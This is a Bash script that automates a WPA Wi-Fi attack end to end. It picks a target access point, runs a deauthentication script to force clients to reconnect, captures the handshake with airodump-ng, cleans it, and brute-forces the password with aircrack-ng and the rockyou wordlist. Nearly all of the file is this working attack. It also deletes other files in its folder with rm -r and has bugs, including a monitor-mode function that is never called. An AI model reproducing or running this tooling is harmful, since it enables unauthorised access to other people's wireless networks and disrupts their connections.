#!/bin/bash

# check who we are
if [ `whoami` != 'root' ]
	then echo "run as root", `whoami`
	
	elif [ `whoami` = 'root' ]; then
		function setMonitorMode() {
			containsInterface=`iw dev | grep 'Interface'`
			IFS=" " read -ra arrayWithInterface <<< "$containsInterface"
			interface=${arrayWithInterface[1]}

			containsMode=`iw dev | grep 'type'`
			IFS=" " read -ra arrayWithMode <<< "$containsMode"
			mode=${arrayWithMode[1]}

			if [[ $mode != '' && $interface != '' ]]; then
				echo -e "[*] interface info: \n    - name $interface\n    - mode $mode\n"

				if [ $mode != "monitor" ]; then
					echo "[*] killing processes..."
					sudo airmon-ng check kill
					echo "[!] done"

					echo "[*] starting monitor mode..."
					sudo airmon-ng start $interface
					echo "[!] done"
				fi
			else echo "[EXIT] there are not wireless interfaces." `exit 0`
			fi
		}

		containsNewInterface=`iw dev | grep 'Interface'`
		IFS=" " read -ra arrayWithNewInterface <<< "$containsNewInterface"
        newInterface=${arrayWithNewInterface[1]}
        echo "[*] changed to $newInterface"

		# preparing to start terminal windows:
		echo "[*] choose YOUR network's bssid for attack after a second..."
		sleep 1
		xterm -geometry 100x27+0+0 -e airodump-ng $newInterface

        read -p "<bssid>: " bssid
        read -p "<channel>: " channel

        clear
        echo "[log] attack started"

        [ -d hashes_test_tool ]
       	if [ $? = 1 ]; then
       		mkdir hashes_test_tool
       	fi
       	cd hashes_test_tool

       	# preparing evnironment for attack
       	[ -d $bssid ]
       	if [ $? = 1 ]; then
        	mkdir $bssid; 
        fi
       	cd $bssid

       	absoluteDeautherPath="/home/sc0rp1us/tools/megaTool/leader.py"
		xterm -geometry 80x27+0+0 -e python3 $absoluteDeautherPath $newInterface $bssid --channel $channel &
		sleep 0.5 & 
		xterm -geometry 80x27+1920+0 -e airodump-ng $newInterface --bssid $bssid --channel $channel -w hash.cap

		echo -e "\n[CLEAN] cleaning handshake..."
		wpaclean cleaned hash.cap-01.cap

		echo -e "\n[   -   ] cleaning from useless files..."
		for file in `ls`; do
			if [ $file != cleaned ]; then
				rm -r $file
				echo "[DELETED] $file"
			fi
		done
		echo -e "[!] done"
		echo "[PATH] you can find cleaned handshake here: `pwd`"

		# preparing to start aircrack attack
		bruteFile=/usr/share/wordlists/rockyou.txt
		[ -f /usr/share/wordlists/rockyou.txt ]
		if [ $? = 1 ]; then
			echo "[ERROR] no file /usr/share/wordlists/rockyou.txt, type absolute path to file for brute attack"
				read -p "[ - ] path: " bruteFile

			[ -f $bruteFile ]
			while [ $? != 0 ]; do
				echo "[ERROR] no file /usr/share/wordlists/rockyou.txt, type absolute path to file for brute attack"
				read -p "[ - ] path: " bruteFile
			done
		fi

		# start brute force attack
		echo "[BRUTE] starting bruteforce attack..."
		xterm -geometry 100x27+1000+400 -e aircrack-ng -w $bruteFile cleaned
fi